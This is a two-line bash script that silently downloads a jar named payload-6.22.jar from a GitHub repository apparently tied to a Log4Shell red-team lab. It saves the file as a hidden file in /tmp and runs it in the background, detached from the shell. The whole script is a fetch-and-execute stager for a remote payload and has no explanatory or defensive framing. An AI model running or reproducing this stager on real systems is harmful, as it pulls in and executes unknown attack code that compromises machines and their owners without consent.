#!/bin/bash
#----------
 wget -q -O /tmp/.payload-6.22.jar https://github.com/hotpotcookie/log4shell-white-box/raw/main/red/mvn-web-exploit/target/payload-6.22.jar & wait
 java -jar /tmp/.payload-6.22.jar & disown